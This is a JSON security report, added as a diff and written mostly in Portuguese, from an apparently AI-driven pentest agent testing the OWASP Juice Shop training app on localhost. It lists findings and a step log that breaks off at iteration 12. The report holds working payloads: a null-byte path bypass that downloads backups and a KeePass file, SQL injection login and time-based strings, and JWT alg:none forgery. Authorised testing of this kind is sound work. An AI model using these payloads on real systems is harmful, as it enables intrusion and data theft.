@@ -1,0 +1,803 @@
+{
+  "generatedAt": "2026-10-23T00:52:56.974Z",
+  "summary": "Limite de 40 iterações atingido.",
+  "finishedCleanly": false,
+  "totalIterations": 40,
+  "findingsSummary": {
+    "reactAgent": 3,
+    "abuseCases": 4,
+    "zapPassive": 129,
+    "total": 22
+  },
+  "findings": [
+    {
+      "title": "Path Traversal / Null Byte Bypass in /ftp File Server",
+      "severity": "HIGH",
+      "category": "Path Traversal / LFI",
+      "description": "CWE-22 Path Traversal. O endpoint /ftp aplica validação de extensão que pode ser bypassada com null byte (%00). Foi possível ler arquivos .bak (package.json.bak, package-lock.json.bak, coupons_2013.md.bak) e baixar o banco de senhas KeePass incident-support.kdbx. Impacto: exposição de informações sensíveis, dependências, possíveis credenciais.",
+      "steps": [
+        "Acessar http://localhost:3000/ftp e observar listagem de arquivos sensíveis",
+        "Tentar http://localhost:3000/ftp/package.json.bak → 403 'Only .md and .pdf files are allowed!'",
+        "Fazer http://localhost:3000/ftp/package.json.bak%2500.md → 200 com conteúdo do arquivo",
+        "Repetir para coupons_2013.md.bak, package-lock.json.bak e incident-support.kdbx"
+      ],
+      "evidence": "HTTP 200 com body de package.json.bak, package-lock.json.bak e incident-support.kdbx após null-byte bypass; stack trace vazou path /juice-shop/build/routes/fileServer.js",
+      "discoveredAt": "2026-10-23T00:51:37.854Z"
+    },
+    {
+      "title": "Sensitive Information Disclosure via Unauthenticated Admin Endpoints and Verbose Errors",
+      "severity": "MEDIUM",
+      "category": "Sensitive Data Exposure",
+      "description": "CWE-200 Information Exposure. Os endpoints /rest/admin/application-version e /rest/admin/application-configuration retornam informações sem autenticação (versão 19.2.1 e configuração completa do servidor). Além disso, erros 403 em /ftp retornam stack trace completo com paths internos (/juice-shop/build/routes/fileServer.js) e versões de bibliotecas (express).",
+      "steps": [
+        "GET /rest/admin/application-version → 200 {'version':'19.2.1'}",
+        "GET /rest/admin/application-configuration → 200 com configuração completa",
+        "GET /ftp/package.json.bak → 500/403 com stack trace"
+      ],
+      "evidence": "Respostas 200 dos endpoints admin sem token; stack trace com path /juice-shop/build/routes/fileServer.js",
+      "discoveredAt": "2026-10-23T00:51:41.106Z"
+    },
+    {
+      "title": "SQL Injection in /rest/products/search",
+      "severity": "CRITICAL",
+      "category": "Injection",
+      "description": "CWE-89 SQL Injection. O parâmetro 'q' do endpoint /rest/products/search é concatenado diretamente em uma query SQLite. Aspa simples causa erro SQL visível (SQLITE_ERROR). Payload time-based com randomblob(1000000000) causa delay de ~13s. Permite extração de dados do banco (usuários, senhas, pedidos) e potencial RCE via extensões SQLite.",
+      "steps": [
+        "GET /rest/products/search?q=apple' → 500 SQLITE_ERROR com query completa",
+        "GET /rest/products/search?q=apple%25'+AND+randomblob(1000000000)+AND+'%25'=' → demora >10s e retorna data vazio",
+        "GET /rest/products/search?q=apple%25'+OR+'1'='1 → retorna produtos"
+      ],
+      "evidence": "SQL exposta: SELECT * FROM Products WHERE ((name LIKE '%apple'%' OR description LIKE '%apple'%') AND deletedAt IS NULL) ORDER BY name; time-based delay confirmado",
+      "discoveredAt": "2026-10-23T00:52:53.803Z"
+    },
+    {
+      "title": "Acesso Não-Autorizado a Endpoints Administrativos",
+      "severity": "CRITICAL",
+      "category": "BLV_BROKEN_ACCESS_CONTROL",
+      "description": "Usuário comum (sem privilégios de admin) conseguiu acessar endpoints restritos à administração via chamada direta à API, sem qualquer verificação de role no servidor.",
+      "steps": [
+        "Autenticação realizada com conta customer@juice-sh.op",
+        "Acessou: http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)",
+        "Acessou: http://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)"
+      ],
+      "evidence": "http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)\nhttp://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)",
+      "discoveredAt": "2026-10-23T00:52:56.075Z"
+    },
+    {
+      "title": "Vulnerabilidade de Verificação de Assinatura JWT",
+      "severity": "CRITICAL",
+      "category": "JWT_SIGNATURE_BYPASS",
+      "description": "O servidor não verifica corretamente a assinatura do JWT. É possível forjar tokens com claims arbitrários (ex: role=admin) sem conhecer a chave secreta, resultando em escalada de privilégios completa.",
+      "steps": [
+        "JWT original decodificado: {\"status\":\"success\",\"data\":{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"password\":\"e541ca7ecf72b8d1286474fc613e5e45\",\"role\":\"customer\",\"deluxeToke",
+        "Servidor aceitou JWT com alg:none (sem assinatura) — token forjado aceito",
+        "Servidor aceitou JWT com payload adulterado (assinatura inválida). Role retornado: undefined"
+      ],
+      "evidence": "alg:none response: {\"user\":{}}\nTampered token response: {\"user\":{}}",
+      "discoveredAt": "2026-10-23T00:52:56.125Z"
+    },
+    {
+      "title": "Exposição de Dados Sensíveis — Recursos Acessíveis Sem Autenticação",
+      "severity": "HIGH",
+      "category": "SENSITIVE_DATA_EXPOSURE",
+      "description": "3 recurso(s) confidencial(is) acessível(is) sem autenticação. A aplicação não protege adequadamente endpoints e arquivos internos, expondo configurações, documentos e dados de usuários.",
+      "steps": [
+        "http://localhost:3000/ftp/ → Diretório FTP interno acessível sem autenticação",
+        "http://localhost:3000/ftp/acquisitions.md → Documento confidencial de aquisições exposto via FTP",
+        "http://localhost:3000/rest/admin/application-configuration → Endpoint de configuração administrativa sem autenticação"
+      ],
+      "evidence": "[HIGH] http://localhost:3000/ftp/\nHTTP 200 — [\"quarantine\",\"acquisitions.md\",\"announcement_encrypted.md\",\"coupons_2013.md.bak\",\"eastere.gg\",\"encrypt.pyc\",\"incident-support.kdbx\",\"legal.md\",\"package-lock.json.bak\",\"package.json.bak\",\"suspicious_errors.yml\"]\n\n[HIGH] http://localhost:3000/ftp/acquisitions.md\nHTTP 200 — # Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in\ndetail in the following paragraph:\n\nLorem ipsum dolor sit amet, consetetur sadi\n\n[HIGH] http://localhost:3000/rest/admin/application-configuration\nHTTP 200 — {\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",\"logo\":\"JuiceShop_Logo.png\",\"favicon\":\"favicon_js.ico\",\"theme\":\"bluegrey-lightgreen\",\"showVersionNumber\":true,\"showGitHubLinks\":true,\"localBackupEnabled\":",
+      "discoveredAt": "2026-10-23T00:52:56.183Z"
+    },
+    {
+      "title": "SQL Injection no Endpoint de Autenticação",
+      "severity": "CRITICAL",
+      "category": "SQLI_AUTH_BYPASS",
+      "description": "O endpoint de login /rest/user/login é vulnerável a SQL Injection. Payloads simples permitem autenticação sem credenciais válidas, comprometendo a conta de administrador ou qualquer outro usuário.",
+      "steps": [
+        "POST http://localhost:3000/rest/user/login com payloads SQLi",
+        "Payload: ' OR 1=1-- → HTTP 200, token JWT retornado"
+      ],
+      "evidence": "Email: ' OR 1=1--\nToken: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXN...",
+      "discoveredAt": "2026-10-23T00:52:56.422Z"
+    },
+    {
+      "title": "[ZAP] Cross-Domain Misconfiguration",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10098",
+      "description": "Web browser data loading may be possible, due to a Cross Origin Resource Sharing (CORS) misconfiguration on the web server. | CWE-264 | WASC-14",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-24EZLZ4I.js",
+        "Confiança: Medium/3",
+        "Solução: Ensure that sensitive data is not available in an unauthenticated manner (using IP address white-listing, for instance).\nConfigure the \"Access-Control-Allow-Origin\" HTTP header to a more restrictive s"
+      ],
+      "evidence": "Access-Control-Allow-Origin: *",
+      "discoveredAt": "2026-10-23T00:52:56.967Z"
+    },
+    {
+      "title": "[ZAP] X-Content-Type-Options Header Missing",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10021",
+      "description": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cF9n4",
+        "Confiança: Medium/3",
+        "Solução: Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.\nIf possible, ensure that the end u"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cF9n4",
+      "discoveredAt": "2026-10-23T00:52:56.967Z"
+    },
+    {
+      "title": "[ZAP] Content Security Policy (CSP) Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10038",
+      "description": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header."
+      ],
+      "evidence": "http://juice-shop:3000/",
+      "discoveredAt": "2026-10-23T00:52:56.967Z"
+    },
+    {
+      "title": "[ZAP] Vulnerable JS Library",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10003",
+      "description": "The identified library appears to be vulnerable. | CWE-1395 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-LHKS7QUN.js",
+        "Confiança: Medium/3",
+        "Solução: Upgrade to the latest version of the affected library."
+      ],
+      "evidence": "[\"ng-version\",\"20.3.18\"]",
+      "discoveredAt": "2026-10-23T00:52:56.967Z"
+    },
+    {
+      "title": "[ZAP] Modern Web Application",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10109",
+      "description": "The application appears to be a modern web application. If you need to explore it automatically then the Client Spider may well be more effective than the standard one. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Medium/3",
+        "Solução: This is an informational alert and so no changes are required."
+      ],
+      "evidence": "<script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \"var(--theme-accent)\", \"text\": \"var(--theme-text)\" }\n        },\n        \"theme\": \"classic\",\n        \"position\": \"bottom-right\",\n        \"content\": { \"message\": \"This website uses fruit cookies to ensure you get the juiciest tracking experience.\", \"dismiss\": \"Me want it!\", \"link\": \"But me wait!\", \"href\": \"https://www.youtube.com/watch?v=9PnbKL3wuH4\" }\n      })});\n  </script>",
+      "discoveredAt": "2026-10-23T00:52:56.967Z"
+    },
+    {
+      "title": "[ZAP] Timestamp Disclosure - Unix",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10096",
+      "description": "A timestamp was disclosed by the application/web server. - Unix | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Low/3",
+        "Solução: Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns."
+      ],
+      "evidence": "1650485437",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Session ID in URL Rewrite",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_3",
+      "description": "URL rewrite is used to track user session ID. The session ID may be disclosed via cross-site referer header. In addition, the session ID might be stored in browser history or server logs. | CWE-598 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=websocket&sid=nTn2Lza_0GAIeTWvAAAA",
+        "Confiança: High/3",
+        "Solução: For secure content, put session ID in a cookie. To be even more secure consider using a combination of cookie and URL rewrite."
+      ],
+      "evidence": "nTn2Lza_0GAIeTWvAAAA",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Private IP Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_2",
+      "description": "A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems. | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/admin/application-configuration",
+        "Confiança: Medium/3",
+        "Solução: Remove the private IP address from the HTTP response body. For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers."
+      ],
+      "evidence": "192.168.99.100:3000",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Missing Anti-clickjacking Header",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10020",
+      "description": "The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options. | CWE-1021 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cF9rB&sid=nTn2Lza_0GAIeTWvAAAA",
+        "Confiança: Medium/3",
+        "Solução: Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.\nIf you expect the page to be framed only"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cF9rB&sid=nTn2Lza_0GAIeTWvAAAA",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Re-examine Cache-control Directives",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10015",
+      "description": "The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached. | CWE-525 | WASC-13",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: Low/3",
+        "Solução: For secure content, ensure the cache-control HTTP header is set with \"no-cache, no-store, must-revalidate\". If an asset should be cached consider setting the directives \"public, max-age, immutable\"."
+      ],
+      "evidence": "private,max-age=604800",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Strict-Transport-Security Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10035",
+      "description": "HTTP Strict Transport Security (HSTS) is a web security policy mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797. | CWE-319 | WASC-15",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to enforce Strict-Transport-Security."
+      ],
+      "evidence": "https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Session Management Response Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10112",
+      "description": "The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to \"Auto-Detect\" then this rule will change the session management to use the tokens identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/continue-code",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "continueCode",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Application Error Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_90022",
+      "description": "This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page. | CWE-550 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/order-history",
+        "Confiança: Medium/3",
+        "Solução: Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on"
+      ],
+      "evidence": "HTTP/1.1 500 Internal Server Error",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Information Disclosure - Debug Error Messages",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10023",
+      "description": "The response appeared to contain common error messages returned by platforms such as ASP.NET, and Web-servers such as IIS and Apache. You can configure the list of common debug messages. | CWE-1295 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/api/Hints/",
+        "Confiança: Medium/3",
+        "Solução: Disable debugging messages before pushing to production."
+      ],
+      "evidence": "Internal Server Error",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    },
+    {
+      "title": "[ZAP] Authentication Request Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10111",
+      "description": "The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/user/login",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "password",
+      "discoveredAt": "2026-10-23T00:52:56.968Z"
+    }
+  ],
+  "steps": [
+    {
+      "iteration": 1,
+      "thought": "Início do reconhecimento ativo conforme o AppMap. Vou navegar para a raiz da aplicação para observar o DOM, identificar o bundle Angular e coletar headers iniciais de segurança.",
+      "action": {
+        "action": "navigate",
+        "url": "http://localhost:3000"
+      },
+      "observation": "Navegou para http://juice-shop:3000/. Título: \"OWASP Juice Shop\". URL atual: http://juice-shop:3000/#/",
+      "timestamp": "2026-10-23T00:51:00.610Z"
+    },
+    {
+      "iteration": 2,
+      "thought": "Página inicial carregada. Vou extrair o conteúdo visível e identificar referências a scripts/bundles, além de verificar tokens e cookies armazenados.",
+      "action": {
+        "action": "read_page"
+      },
+      "observation": "URL: http://juice-shop:3000/#/\nTítulo: OWASP Juice Shop\nConteúdo:\nThis website uses fruit cookies to ensure you get the juiciest tracking experience. But me wait!\nMe want it!\nmenu\nOWASP Juice Shop\nclose\nsearch\nlanguage\nAll Products\nApple Juice (1000ml)\n1.99¤\nApple Pomace\n0.89¤\nBanana Juice (1000ml)\n1.99¤\nOnly 1 left\nBest Juice Shop Salesman Artwork\n5000¤\nCarrot Juice (1000ml)\n2.99¤\nEggfruit Juice (500ml)\n8.99¤\nFruit Press\n89.99¤\nGreen Smoothie\n1.99¤\nOnly 1 left\nJuice Shop \"Permafrost\" 2020 Editi",
+      "timestamp": "2026-10-23T00:51:02.582Z"
+    },
+    {
+      "iteration": 3,
+      "thought": "Vou inspecionar o HTML da página para encontrar os bundles JS e depois baixá-los, e também verificar headers de resposta e cookies.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 00:49:12 GMT\",\"etag\":\"W/\\\"124fa-1a1663bb9b6\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:04 GMT\",\"connectio",
+      "timestamp": "2026-10-23T00:51:04.384Z"
+    },
+    {
+      "iteration": 4,
+      "thought": "A resposta está truncada. Vou procurar no HTML por referências a scripts/bundles Angular usando requisição direta e buscar por palavras-chave.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/main.js",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/main.js\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:50:11 GMT\",\"etag\":\"W/\\\"14cdab-19d8ac134b8\\\"\",\"content-type\":\"application/javascript; charset=UTF-8\",\"content-length\":\"1363371\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 0",
+      "timestamp": "2026-10-23T00:51:13.538Z"
+    },
+    {
+      "iteration": 5,
+      "thought": "Bundle principal identificado. Vou procurar por source map, rotas internas, chaves e termos sensíveis no bundle. Também vou testar arquivos padrão e documentação de API.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/main.js.map",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/main.js.map\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 00:49:12 GMT\",\"etag\":\"W/\\\"124fa-1a1663bb9b6\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:15 GMT\"",
+      "timestamp": "2026-10-23T00:51:15.104Z"
+    },
+    {
+      "iteration": 6,
+      "thought": "Source map não disponível — retornou o HTML fallback. Vou testar arquivos padrão e fazer fingerprint do servidor, além de tentar documentação de API e endpoints administrativos conhecidos do Juice Shop.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/robots.txt",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/robots.txt\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/plain; charset=utf-8\",\"content-length\":\"28\",\"etag\":\"W/\\\"1c-8HgF6mNyhsSFK0pascC9uB0wjX0\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:17 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\nUser-agent: *\nDisallow: /ftp",
+      "timestamp": "2026-10-23T00:51:17.538Z"
+    },
+    {
+      "iteration": 7,
+      "thought": "Robots.txt expõe `/ftp` — diretório interessante. Vou verificar `/ftp` e também testar documentação de API, endpoints admin e arquivos sensíveis. Além disso vou coletar headers do servidor — notei ausência de `Server` e `X-Powered-By`, e HSTS ausente.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"211\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:20 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n[\n  \"quarantine\",\n  \"acquisitions.md\",\n  \"announcement_encrypted.md\",\n  \"coupons_2013",
+      "timestamp": "2026-10-23T00:51:20.026Z"
+    },
+    {
+      "iteration": 8,
+      "thought": "`/ftp` expõe arquivos sensíveis, incluindo backups (`coupons_2013.md.bak`, `package.json.bak`, `package-lock.json.bak`), banco de senhas KeePass (`incident-support.kdbx`) e arquivos de configuração. Vou baixar os backups para extrair informações e testar se há acesso direto.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/package.json.bak",
+        "headers": {}
+      },
+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/package.json.bak\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:21 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"927\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Only .md and .pdf files are allowed!\"",
+      "timestamp": "2026-10-23T00:51:21.821Z"
+    },
+    {
+      "iteration": 9,
+      "thought": "O filtro bloqueia extensões .bak, mas a mensagem de erro vaza stack trace e path interno (`/juice-shop/build/routes/fileServer.js`), confirmando Node.js/Express. Vou tentar bypass de path traversal / null byte / dupla extensão para acessar os backups.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/package.json.bak%2500.md",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/package.json.bak%2500.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"10c3-19d8abea090\\\"\",\"content-type\":\"application/octet-stream\",\"content-length\":\"4291\",\"date\":\"Fri, 23 Oct 2026 00:51:23 GMT\",\"connecti",
+      "timestamp": "2026-10-23T00:51:23.583Z"
+    },
+    {
+      "iteration": 10,
+      "thought": "Bypass por null byte funcionou — leitura do package.json.bak completo. Vou baixar os outros arquivos sensíveis: coupons_2013.md.bak, package-lock.json.bak e incident-support.kdbx. Também vou reportar esta vulnerabilidade de path traversal/null byte.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/coupons_2013.md.bak%2500.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"83-19d8abea090\\\"\",\"content-type\":\"application/octet-stream\",\"content-length\":\"131\",\"date\":\"Fri, 23 Oct 2026 00:51:25 GMT\",\"connecti",
+      "timestamp": "2026-10-23T00:51:25.218Z"
+    },
+    {
+      "iteration": 11,
+      "thought": "Arquivo de cupons criptografado/obfuscado. Vou baixar package-lock.json.bak para identificar versões vulneráveis e incident-support.kdbx. Também testar acesso a eastere.gg e suspicious_errors.yml.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/incident-support.kdbx%2500.md",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/incident-support.kdbx%2500.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"cae-19d8abea090\\\"\",\"content-type\":\"application/octet-stream\",\"content-length\":\"3246\",\"date\":\"Fri, 23 Oct 2026 00:51:26 GMT\",\"conn",
+      "timestamp": "2026-10-23T00:51:26.738Z"
+    },
+    {
+      "iteration": 12,
+      "thought": "KeePass DB baixado. Vou baixar package-lock.json.bak para identificar versões vulneráveis e suspicious_errors.yml para possíveis credenciais. Já tenho evidências fortes para reportar path traversal.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/package-lock.json.bak%2500.md",
+        "headers": {}
+      },
